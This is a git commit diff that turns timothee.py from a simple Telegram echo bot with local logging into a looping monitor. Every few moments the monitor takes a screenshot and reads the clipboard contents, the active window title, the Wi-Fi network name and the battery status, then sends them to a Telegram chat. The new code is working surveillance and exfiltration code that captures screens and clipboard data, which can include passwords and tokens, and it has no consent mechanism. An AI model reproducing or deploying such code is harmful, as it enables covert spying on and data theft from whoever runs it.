23d2789066b8a0a3b899bae7fcb95b850da33af8
akhilrajs <67222042+akhilrajs@users.noreply.github.com>
2023-04-17 17:11:07 +0530

    Update timothee.py

--- timothee.py
+++ timothee.py
@@ -1,51 +1,78 @@
-# -*- coding: utf-8 -*-
-"""
-Created on Wed Jan 11 21:18:23 2023
-
-@author: akhilrajs
-"""
-
-import telebot
-from datetime import date
+import psutil
+import telegram
+import time
 from datetime import datetime
-from time import strftime
-from os import path
-from os import makedirs
-from os import getcwd
+import pygetwindow as gw
+import subprocess
+from PIL import ImageGrab
+import pyautogui
+import pyperclip
 
-# create a log folder and file for storing all activities 
-date = str(date.today())
-print("[#] date : " + str(date))
-if not path.exists('log_data'):
-    print("[#] creating log_data directory")
-    makedirs('log_data')
-cd = getcwd() + "\\log_data"
-log_folder = (cd + "\\" + (date))
-if not path.exists(log_folder):
-    print("[#] creating folder with date for logs")
-    makedirs(log_folder)
-cd = cd + "\\" + date
-now = datetime.now()
-current_time = strftime("%H_%M_%S")
+def get_current_application_title():
+    """Get the title of the current foreground window"""
+    try:
+        return gw.getActiveWindow().title
+    except:
+        return 'Unknown'
 
+def get_connected_wifi_name():
+    """Get the name of the connected Wi-Fi network"""
+    try:
+        output = subprocess.check_output('netsh wlan show interfaces')
+        output = output.decode('utf-8').split('\n')
+        for line in output:
+            if 'SSID' in line and 'BSSID' not in line:
+                return line.split(':')[1].strip()
+    except:
+        pass
+    return 'Unknown'
 
+def take_screenshot():
+    """Take a screenshot and save it to a file"""
+    screenshot = pyautogui.screenshot()
+    screenshot.save('screenshot.png')
 
-# defining a function to save logs
-def save_log(log):
-    log_file = open((log_folder + "\\" + str(current_time) + ".txt"),"a")
-    log_file.write(log)
-    log_file.close()
+def escape_markdown(text):
+    """Escape special characters in Markdown text"""
+    escape_chars = r'_*[]()~`>#+-=|{}.!'
+    return ''.join('\\' + char if char in escape_chars else char for char in text)
 
+TOKEN = 'enter_your_token_here'
+bot = telegram.Bot(token=TOKEN)
+chat_id = 'enter_your_chat_id_here'
 
-# create a new bot using the token provided by the Telegram Bot Father
-bot = telebot.TeleBot("5950108813:")
+# Initialize message and photo IDs
+message_id = None
+photo_id = None
 
-# define a function that will be called when a message is received
-@bot.message_handler(content_types=['text'])
-def handle_message(message):
-    print("Received message:", message.text)
-    bot.send_message(message.chat.id, "Thank you for your message!")
+while True:
+    # Update information
+    battery = psutil.sensors_battery()
+    percent = battery.percent
+    status = 'Charging' if battery.power_plugged else 'Not charging'
+    now = datetime.now().strftime('%H:%M:%S')
+    current_application = escape_markdown(get_current_application_title())
+    wifi_name = escape_markdown(get_connected_wifi_name())
+    clipboard_content = escape_markdown(pyperclip.paste())
+    message_text = f'*{now}* : \nBattery percentage: {percent}\nStatus: {status}\nCurrent application: {current_application}\nConnected Wi-Fi: {wifi_name}\nClipboard content: {clipboard_content}'
 
+    # Take screenshot and send or edit photo
+    take_screenshot()
+    try:
+        if photo_id is None:
+            photo_message = bot.send_photo(chat_id=chat_id, photo=open('screenshot.png', 'rb'))
+            photo_id = photo_message.message_id
+        else:
+            bot.edit_message_media(chat_id=chat_id, message_id=photo_id, media=telegram.InputMediaPhoto(open('screenshot.png', 'rb')))
+    except telegram.error.BadRequest as e:
+       print(f'Error editing photo: {e.message}')
 
-# start the bot
-bot.polling()
+    # Send or edit message
+    try:
+        if message_id is None:
+            text_message = bot.send_message(chat_id=chat_id, text=message_text, parse_mode='Markdown')
+            message_id = text_message.message_id
+        else:
+            bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=message_text, parse_mode='Markdown')
+    except telegram.error.BadRequest as e:
+        print(f'Error editing message: {e.message}')
